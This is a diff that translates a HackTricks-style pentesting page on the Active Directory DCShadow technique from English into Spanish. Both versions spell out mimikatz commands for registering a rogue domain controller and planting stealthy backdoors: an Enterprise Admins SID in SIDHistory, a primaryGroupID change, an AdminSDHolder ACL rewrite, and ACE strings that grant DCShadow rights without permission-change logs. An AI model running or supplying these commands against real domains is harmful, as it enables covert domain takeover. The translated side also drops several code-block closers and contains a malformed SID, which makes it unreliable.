@@ -1,120 +1,89 @@
-
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
-
-
 # DCShadow
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+Registra un **nuevo controlador de dominio** en AD y lo utiliza para **insertar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** de las **modificaciones**. Se necesitan privilegios de DA y estar dentro del **dominio raíz**.\
+Ten en cuenta que si utilizas datos incorrectos, aparecerán registros bastante feos.
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
+Para llevar a cabo el ataque se necesitan 2 instancias de mimikatz. Una de ellas iniciará los servidores RPC con privilegios de SYSTEM (aquí se indicarán los cambios que se quieren realizar), y la otra instancia se utilizará para insertar los valores:
 
-{% code title="mimikatz1 (RPC servers)" %}
+{% code title="mimikatz1 (servidores RPC)" %}
 ```bash
 !+
 !processtoken
 lsadump::dcshadow /object:username /attribute:Description /value="My new description"
 ```
-{% endcode %}
-
-{% code title="mimikatz2 (push) - Needs DA or similar" %}
+{% code title="mimikatz2 (push) - Necesita DA o similar" %}
 ```bash
 lsadump::dcshadow /push
 ```
 {% endcode %}
 
-Notice that **`elevate::token`** won't work in mimikatz1 session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Ten en cuenta que **`elevate::token`** no funcionará en la sesión de mimikatz1 ya que eleva los privilegios del hilo, pero necesitamos elevar los **privilegios del proceso**.\
+También puedes seleccionar un objeto "LDAP": `/object:CN=Administrador,CN=Usuarios,DC=JEFFLAB,DC=local`
 
-You can push the changes from a DA or from a user with this minimal permissions:
+Puedes realizar los cambios desde una cuenta DA o desde una cuenta de usuario con estos permisos mínimos:
 
-* In the **domain object**:
-  * _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  * _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  * _DS-Replication-Synchronize_ (Replication Synchornization)
-* The **Sites object** (and its children) in the **Configuration container**:
-  * _CreateChild and DeleteChild_
-* The object of the **computer which is registered as a DC**:
-  * _WriteProperty_ (Not Write)
-* The **target object**:
-  * _WriteProperty_ (Not Write)
+* En el objeto **dominio**:
+  * _DS-Install-Replica_ (Agregar/Quitar réplica en el dominio)
+  * _DS-Replication-Manage-Topology_ (Administrar topología de replicación)
+  * _DS-Replication-Synchronize_ (Sincronización de replicación)
+* El objeto **Sitios** (y sus hijos) en el contenedor **Configuración**:
+  * _CreateChild y DeleteChild_
+* El objeto del **equipo que está registrado como DC**:
+  * _WriteProperty_ (No Write)
+* El **objeto de destino**:
+  * _WriteProperty_ (No Write)
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
+Puedes utilizar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para otorgar estos permisos a un usuario sin privilegios (ten en cuenta que esto dejará algunos registros). Esto es mucho más restrictivo que tener privilegios DA.\
+Por ejemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Esto significa que el nombre de usuario _**student1**_ cuando inicie sesión en la máquina _**mcorp-student1**_ tendrá permisos DCShadow sobre el objeto _**root1user**_.
 
-## Using DCShadow to create backdoors
+## Usando DCShadow para crear puertas traseras
 
-{% code title="Set Enterprise Admins in SIDHistory to a user" %}
+{% code title="Establecer Enterprise Admins en SIDHistory a un usuario" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 
 ```
-{% endcode %}
-
-{% code title="Chage PrimaryGroupID (put user as member of Domain Administrators)" %}
+{% code title="Cambiar el ID de grupo principal (poner al usuario como miembro de Administradores de Dominio)" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
-{% endcode %}
-
-{% code title="Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)" %}
+{% code title="Modificar ntSecurityDescriptor de AdminSDHolder (dar control total a un usuario)" %}
 ```bash
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
-{% endcode %}
+## Shadowception - Dar permisos a DCShadow usando DCShadow (sin registros de permisos modificados)
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+Necesitamos agregar los siguientes ACEs con el SID de nuestro usuario al final:
 
-We need to append following ACEs with our user's SID at the end:
+* En el objeto de dominio:
+  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDdelUsuario)`
+  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDdelUsuario)`
+  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDdelUsuario)`
+* En el objeto del equipo atacante: `(A;;WP;;;SIDdelUsuario)`
+* En el objeto de usuario objetivo: `(A;;WP;;;SIDdelUsuario)`
+* En el objeto de Sitios en el contenedor de Configuración: `(A;CI;CCDC;;;SIDdelUsuario)`
 
-* On the domain object:
-  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
-  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-* On the attacker computer object: `(A;;WP;;;UserSID)`
-* On the target user object: `(A;;WP;;;UserSID)`
-* On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+Para obtener el ACE actual de un objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Tenga en cuenta que en este caso necesita hacer **varios cambios**, no solo uno. Entonces, en la sesión **mimikatz1** (servidor RPC), use el parámetro **`/stack` con cada cambio** que desee realizar. De esta manera, solo necesitará **`/push`** una vez para realizar todos los cambios acumulados en el servidor malicioso.
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
-
-
-
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**Más información sobre DCShadow en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
-
-
